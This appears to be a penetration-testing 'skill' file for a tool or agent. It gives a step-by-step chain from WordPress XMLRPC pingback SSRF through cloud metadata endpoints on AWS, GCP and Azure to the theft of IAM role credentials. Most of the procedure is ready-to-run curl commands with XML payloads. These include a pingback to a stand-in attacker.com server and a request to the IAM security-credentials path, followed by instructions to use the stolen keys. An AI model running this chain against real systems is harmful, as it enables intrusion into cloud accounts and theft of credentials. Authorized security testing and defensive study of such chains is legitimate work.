---
name: xmlrpc-ssrf-imds
description: Chain XMLRPC pingback SSRF → internal scan → IMDS cloud credentials
version: 1.0.0
phase: chains
category: chaining
tags: [xmlrpc, ssrf, imds, cloud, aws, metadata]
tools: [curl]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - xmlrpc-exploitation
  - hunt-ssrf-cloud
  - cloud-iam-enum
mitre_attack:
  - T1190
  - T1552.005
  - T1078.004
---

## When to Use

Use this skill when WordPress XMLRPC pingback is enabled and the server can
reach cloud metadata endpoints (IMDS). Chain XMLRPC pingback SSRF → internal
network scan → IMDS access → cloud credential theft.

## Prerequisites

- curl
- WordPress with XMLRPC pingback enabled
- Target runs on cloud infrastructure (AWS/GCP/Azure)
- IMDSv1 enabled (or IMDSv2 without token requirement)

## Procedure

```bash
# STEP 1: Confirm XMLRPC pingback is enabled
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | grep "pingback.ping"

# STEP 2: Test SSRF via pingback to attacker server
# On attacker: python3 -m http.server 8888
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://attacker.com:8888</string></value></param><param><value><string>https://TARGET/</string></value></param></params></methodCall>'

# STEP 3: Probe IMDS endpoints via pingback
# AWS IMDSv1:
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param><param><value><string>https://TARGET/</string></value></param></params></methodCall>'

# GCP metadata:
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://metadata.google.internal/computeMetadata/v1/</string></value></param><param><value><string>https://TARGET/</string></value></param></params></methodCall>'

# Azure IMDS:
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254/metadata/instance?api-version=2021-02-01</string></value></param><param><value><string>https://TARGET/</string></value></param></params></methodCall>'

# STEP 4: Extract IAM role credentials from AWS IMDS
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254/latest/meta-data/iam/security-credentials/</string></value></param><param><value><string>https://TARGET/</string></value></param></params></methodCall>'

# STEP 5: Use stolen credentials to access cloud resources
# Parse credentials from pingback error response
# Access S3, EC2, or other services with stolen keys
```

## OPSEC Rules

- **CRITICAL**: IMDS access reveals cloud credentials — extreme sensitivity
- Do not use stolen cloud credentials for unauthorized access
- Document IAM role name and permissions
- Do not create new cloud resources with stolen credentials
- Clean up any cloud artifacts created during testing
- IMDSv2 requires token — may limit this chain

## Verification

- Confirm pingback receives requests from target
- Verify IMDS endpoint is reachable via SSRF
- Test cloud credential extraction
- Confirm stolen credentials are valid

## Pitfalls

- IMDSv2 requires PUT request with token (blocks simple SSRF)
- WAF may block pingback to internal IPs
- Cloud provider may detect IMDS access anomalies
- Some cloud instances have IMDS disabled
- Pingback response may not include full metadata
- Network segmentation may block IMDS access

## Output Format

```
[CHAIN] XMLRPC SSRF → IMDS → Cloud Credentials chain successful
  Step 1: XMLRPC pingback confirmed enabled
  Step 2: SSRF via pingback to 169.254.169.254
  Step 3: IMDSv1 accessible (metadata endpoint)
  Step 4: IAM role: WebAppRole
  Step 5: Temporary credentials: AKIA... (valid)
  Cloud: AWS
  Severity: CRITICAL (9.0)
```
